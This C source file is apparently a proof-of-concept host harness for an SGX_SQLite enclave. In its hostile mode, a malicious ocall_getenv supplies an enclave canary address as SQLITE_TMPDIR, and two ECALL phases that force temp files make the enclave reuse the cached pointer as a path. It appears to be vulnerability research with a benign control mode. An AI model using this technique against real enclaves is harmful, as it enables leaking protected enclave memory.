/*
 * C03 host control for the selected SGX_SQLite Unix-VFS route.
 *
 * The host is the attacker in V2: ocall_getenv can return a chosen raw
 * enclave address. This harness creates the two-ECALL temp-file sequence that
 * makes unixTempFileDir cache that value in static azDirs and later use it as
 * an [in,string] path. The OCALL bodies live in c03_ocalls.c so the untrusted
 * bridge header's EDL types do not collide with the host's glibc types.
 *
 * Modes:
 *   benign   ocall_getenv returns the host environment value.
 *   hostile  ocall_getenv returns the host-supplied enclave canary address
 *            for SQLITE_TMPDIR and the host environment value for TMPDIR.
 *
 * The caller must leave TMPDIR/SQLITE_TMPDIR unset for the benign control.
 */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <sgx_urts.h>
#include "Enclave_u.h"
#include "c03_ocalls.h"

#define STR2(x) #x
#define STR(x) STR2(x)
#ifndef TRIGGER_ROWS
#define TRIGGER_ROWS 10000
#endif

#define TRIGGER_A \
    "PRAGMA temp_store=FILE;PRAGMA temp.cache_size=10;" \
    "CREATE TEMP TABLE c03a(x);" \
    "WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<" STR(TRIGGER_ROWS) ")" \
    " INSERT INTO c03a SELECT x FROM c;" \
    "SELECT x FROM c03a ORDER BY x DESC LIMIT 3;"

#define TRIGGER_B \
    "PRAGMA temp_store=FILE;PRAGMA temp.cache_size=10;" \
    "CREATE TEMP TABLE c03b(x);" \
    "WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<" STR(TRIGGER_ROWS) ")" \
    " INSERT INTO c03b SELECT x FROM c;" \
    "SELECT x FROM c03b ORDER BY x DESC LIMIT 3;"

static int execute(sgx_enclave_id_t eid, const char *sql)
{
    sgx_status_t status = ecall_execute_sql(eid, sql);
    if (status != SGX_SUCCESS) {
        fprintf(stderr, "[c03] ecall_execute_sql failed: 0x%x\n", status);
        return 0;
    }
    return 1;
}

int main(int argc, char **argv)
{
    sgx_enclave_id_t eid = 0;
    sgx_launch_token_t token = {0};
    int updated = 0;
    sgx_status_t status;
    int phase_ok = 1;
    int hostile = 0;
    uintptr_t canary_address = 0;

    if (argc < 3 || argc > 5) {
        fprintf(stderr, "usage: %s <enclave.signed.so> <database> "
                        "[benign|hostile] [canary-address]\n", argv[0]);
        return 2;
    }
    if (argc >= 4) {
        if (strcmp(argv[3], "hostile") == 0) {
            hostile = 1;
        } else if (strcmp(argv[3], "benign") != 0) {
            fprintf(stderr, "[c03] unknown mode: %s\n", argv[3]);
            return 2;
        }
    }
    if (hostile) {
        if (argc != 5) {
            fprintf(stderr, "[c03] hostile mode needs a canary address\n");
            return 2;
        }
        canary_address = (uintptr_t)strtoull(argv[4], NULL, 0);
        if (canary_address == 0) {
            fprintf(stderr, "[c03] invalid canary address\n");
            return 2;
        }
    }
    c03_configure(hostile, canary_address);

    status = sgx_create_enclave(argv[1], SGX_DEBUG_FLAG, &token, &updated,
                                &eid, NULL);
    if (status != SGX_SUCCESS) {
        fprintf(stderr, "[c03] sgx_create_enclave failed: 0x%x\n", status);
        return 1;
    }

    /* Phase 1: create the connection and force a temp database file. */
    c03_set_phase(1);
    if (ecall_opendb(eid, argv[2]) != SGX_SUCCESS ||
        !execute(eid, "PRAGMA temp_store=FILE;") ||
        !execute(eid, TRIGGER_A)) {
        phase_ok = 0;
    }
    if (phase_ok && ecall_closedb(eid) != SGX_SUCCESS) {
        phase_ok = 0;
    }

    /* Phase 2: close/reopen so unixTempFileDir runs again. static azDirs (and
     * the hostile value cached in it) survives the ECALL boundary. */
    if (phase_ok) {
        c03_set_phase(2);
        if (ecall_opendb(eid, argv[2]) != SGX_SUCCESS ||
            !execute(eid, "PRAGMA temp_store=FILE;") ||
            !execute(eid, TRIGGER_B) ||
            ecall_closedb(eid) != SGX_SUCCESS) {
            phase_ok = 0;
        }
    }

    sgx_destroy_enclave(eid);
    if (!phase_ok) {
        return 1;
    }
    c03_print_summary(hostile);
    return 0;
}
